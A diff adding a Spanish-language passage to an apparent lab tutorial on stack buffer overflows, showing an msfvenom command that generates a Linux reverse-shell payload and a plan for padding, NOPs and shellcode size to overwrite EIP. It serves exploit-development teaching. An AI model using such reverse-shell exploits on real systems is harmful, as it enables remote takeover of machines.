@@ -235,6 +235,27 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 ## Determine the Length for Shellcode
 
+Ahora debemos averiguar cuánto espacio tenemos para que nuestro shellcode realice la acción que queremos. Es muy común y útil que aprovechemos esta vulnerabilidad para obtener un shell inverso. Primero, tenemos que averiguar aproximadamente qué tamaño tendrá el shellcode que insertaremos y, para ello, utilizaremos `msfvenom`.
+
+#### Código Shell - Longitud
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+<SNIP>
+```
+
+Ahora sabemos que nuestra carga útil será de aproximadamente 68 bytes. Como precaución, deberíamos intentar utilizar un rango mayor si el código shell aumenta debido a especificaciones posteriores.
+
+A menudo puede resultar útil insertar algunos `no operation instruction`( `NOPS`) antes de que comience nuestro shellcode para que se pueda ejecutar sin problemas. Resumamos brevemente lo que necesitamos para esto:
+
+1. Necesitamos un total de 1040 bytes para llegar al `EIP`.
+2. Aquí podemos utilizar un adicional `100 bytes`de`NOPs`
+3. `150 bytes`para nuestro `shellcode`.
+
+
 
 
 ## Identifications of Bad Characters
